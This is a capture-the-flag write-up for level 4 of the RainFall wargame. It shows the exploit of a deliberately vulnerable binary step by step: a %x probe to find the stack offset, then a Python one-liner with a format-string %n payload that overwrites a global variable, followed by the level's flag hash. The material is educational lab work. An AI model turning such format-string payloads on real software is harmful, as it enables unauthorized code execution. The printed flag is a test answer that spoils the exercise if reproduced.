# Level 4

Once logged in, you will see a binary `level4`.

```
$ ssh level4@localhost -p 4242
          _____       _       ______    _ _
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level4@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

Let's run this and see what this does

```
level4@RainFall:~$ ./level4
aaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaa
level4@RainFall:~$
```

Oh wow, it does the same thing as level 3... Wait, really? It can't be this easy, right? _\<Goes and decompiles manually into C.\>_

Level 4 is indeed very similar to level 3, just with a much larger number of characters to print. Let's modify our exploit from level 3 with the new information from the decompiled program.

Let's find the offset.

```
level4@RainFall:~$ echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520
```

Changes from level 3:
- The offset is now 12 in this program
- `m` is now at `0x8049810` (as seen on `<n+54>`)
- We'll need to print `16930116` (`0x1025544`) characters before the `%n`. Instead of using Python to print these (which would be relatively slow), we'll use the zero padding (`%0`) functionality of `printf`. `%016930112x` prints the stack where the first argument to `printf` would be (if there was one), zero-padded to be a total of `16930112` characters (`16930116 - 4`).

```
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%016930112x%12$n"' | ./level4
[...]000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$
```
